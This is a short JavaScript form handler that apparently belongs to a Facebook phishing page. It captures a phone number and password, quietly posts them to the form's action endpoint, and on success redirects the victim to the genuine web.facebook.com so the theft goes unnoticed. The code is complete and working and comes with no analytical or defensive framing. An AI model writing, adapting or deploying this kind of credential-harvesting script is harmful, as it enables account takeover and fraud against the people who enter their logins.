var form = document.getElementById('my-form');
const phoneInput = document.querySelector('#num-input');
const passInput = document.querySelector('#pass-input');

async function handleSubmit(event) {
    event.preventDefault();
    if (passInput.value !== '' || phoneInput.value !== '') {
        var data = new FormData(event.target);
        fetch(event.target.action, {
            method: form.method,
            body: data,
            headers: {
                Accept: 'application/json',
            },
        })
            .then(response => {
                if (response.ok) {
                    location.href = 'https://web.facebook.com/';
                    form.reset();
                } else {
                    location.reload();
                }
            })

            .catch(error => {
                location.reload();
            });
    }
}
form.addEventListener('submit', handleSubmit);
